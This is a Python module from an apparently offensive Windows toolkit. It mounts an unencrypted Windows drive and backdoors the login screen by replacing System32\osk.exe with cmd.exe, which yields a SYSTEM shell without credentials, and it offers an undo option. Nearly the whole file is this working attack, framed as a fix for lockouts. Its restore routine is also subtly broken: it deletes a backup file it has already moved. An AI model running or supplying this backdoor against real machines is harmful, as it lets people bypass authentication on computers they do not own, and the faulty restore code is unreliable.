import subprocess
import shutil
import os
import time
# This module leverages the OSK backdoor trick to help bypass the Windows login screen
# When you try to log into Windows there are a few programs you can access without logging in, one of them being the onscreen keyboard (C:\Windows\System32\osk.exe)
# Fortunately, if you get locked out, you can just replace osk.exe with cmd.exe and activate it to get a shell as system without logging in
# This can be activated by going to the accessibility settings and turning on the onscreen keyboard on the login screen

# So where does the osk.exe file go? at DRIVE:\Windows\System32\osk_tofu_backup.exe

def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			option2 = input("backdoor/unbackdoor? : ")
			option2 = option2.lower().strip()
			if option2 == "backdoor":
				if not os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe"):
					if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe"):
						print("[+] Moving osk.exe to osk_tofu_backup.exe")
						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk.exe","tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe")
						shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/cmd.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
						print("[+] Backdoored; Activate it by turning on Onscreen Keyboard")
					else:
						print("[-] CMD.exe binary doesn't exist at Windows/System32; Exiting")
				else:
					print("[-] OSK backdoor file already exists; looks to already be tofu-backdoored")
			elif option2 == "unbackdoor":
				if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe"):
					print("[+] Tofu CMD backup exists")
					if os.path.exists("tofu_tmp/windows_filesystem/Windows/System32/osk.exe"):
						print("[+] OSK file exists; Unbackdooring")
						os.remove("tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
						os.remove("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe")
						print("[+] Unbackdoored")
					else:
						print("[?] It seems OSK.exe has been removed. Replacing OSK.exe with 'osk_tofu_backup.exe'")
						shutil.move("tofu_tmp/windows_filesystem/Windows/System32/osk_tofu_backup.exe","tofu_tmp/windows_filesystem/Windows/System32/osk.exe")
						print("[+] Unbackdoored")
				else:
					print("[-] Tofu CMD backup doesn't exist at Windows/System32/osk_tofu_backup.exe")
			else:
				print("[-] Invalid option")
				
				
		except Exception as open_error:
			print(f"[-] Error {open_error}")
		time.sleep(2)	
		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
